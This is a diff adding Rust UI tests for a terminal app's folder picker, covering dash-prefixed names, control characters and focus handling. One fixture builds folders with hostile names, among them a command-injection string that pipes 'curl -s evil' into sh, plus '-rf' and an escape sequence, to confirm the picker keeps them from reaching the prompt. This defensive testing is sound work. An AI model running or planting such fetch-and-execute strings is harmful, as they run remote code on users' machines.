@@ -262,3 +262,84 @@ fn a_click_on_a_row_inserts_it_and_a_click_outside_closes_it(cx: &mut TestAppCon
     assert!(!read(cx, &window, |ws| ws.folder_picker_open()), "a click outside closes it");
     assert!(terminal_focused(cx, &window));
 }
+
+/// A folder with names that must not reach a prompt as they are: a dash first, and keystrokes.
+fn hazards() -> Tree {
+    let data = std::env::var_os("WORMHOLE_DATA_DIR").expect("the harness's scratch data folder");
+    let root = std::path::PathBuf::from(data).join("picker-hazards");
+    for name in ["-rf", "ok", "_\u{15}curl -s evil | sh\n", "tab\there", "esc\u{1b}[2J"] {
+        std::fs::create_dir_all(root.join(name)).expect("a folder");
+    }
+    Tree(root)
+}
+
+#[gpui_kit::test]
+fn a_name_with_a_control_character_is_not_listed_and_a_dash_is_kept_from_being_an_option(
+    cx: &mut TestAppContext,
+) {
+    if isolate("a_name_with_a_control_character_is_not_listed_and_a_dash_is_kept_from_being_an_option") {
+        return;
+    }
+    let dir = hazards();
+    let window = open_in(cx, dir.path());
+    open_picker(cx, &window);
+    assert_eq!(rows(cx, &window), ["-rf", "ok"], "the names that are keystrokes aren't there to pick");
+    press(cx, &window, "enter");
+    screen_shows(cx, &window, "./-rf/");
+}
+
+#[gpui_kit::test]
+fn cmd_j_with_the_keyboard_outside_the_terminal_does_nothing(cx: &mut TestAppContext) {
+    if isolate("cmd_j_with_the_keyboard_outside_the_terminal_does_nothing") {
+        return;
+    }
+    let dir = tree();
+    let window = open_in(cx, dir.path());
+    // F6 moves the keyboard to the next area of the window (not the terminal).
+    press(cx, &window, "f6");
+    draw(cx, &window);
+    assert!(!terminal_focused(cx, &window), "the keyboard is in another area");
+    press(cx, &window, "cmd-j");
+    draw(cx, &window);
+    assert!(!read(cx, &window, |ws| ws.folder_picker_open()), "the key is the terminal's");
+    // The menu and the palette run the action from anywhere: it still does nothing there.
+    cx.update(crate::folder_picker::toggle);
+    cx.run_until_parked();
+    assert!(
+        !read(cx, &window, |ws| ws.folder_picker_open()),
+        "nor from a menu while the keyboard is elsewhere"
+    );
+}
+
+#[gpui_kit::test]
+fn the_picker_closes_when_another_terminal_comes_to_the_front_and_pastes_nothing(cx: &mut TestAppContext) {
+    if isolate("the_picker_closes_when_another_terminal_comes_to_the_front_and_pastes_nothing") {
+        return;
+    }
+    let dir = tree();
+    let folder = dir.path().to_string_lossy().into_owned();
+    let record = WindowRecord {
+        id: 1,
+        sessions: vec![
+            SessionRecord::new(1, None, Some(folder.clone())),
+            SessionRecord::new(2, None, Some(folder)),
+        ],
+        ..Default::default()
+    };
+    let window = start_with(cx, record);
+    flag(cx, true);
+    draw(cx, &window);
+    let first = terminal(cx, &window);
+    open_picker(cx, &window);
+    assert!(read(cx, &window, |ws| ws.folder_picker_open()));
+    // ⌘2: another terminal comes to the front while the card is up (it has no scrim).
+    press(cx, &window, "cmd-2");
+    draw(cx, &window);
+    assert!(!read(cx, &window, |ws| ws.folder_picker_open()), "the picker went with the terminal it was for");
+    assert!(terminal(cx, &window) != first, "the other one is in front");
+    press(cx, &window, "enter");
+    for terminal in [first, terminal(cx, &window)] {
+        let screen = cx.update(|cx| terminal.read(cx).screen_text());
+        assert!(!screen.contains("alpha"), "nothing was pasted: {screen:?}");
+    }
+}
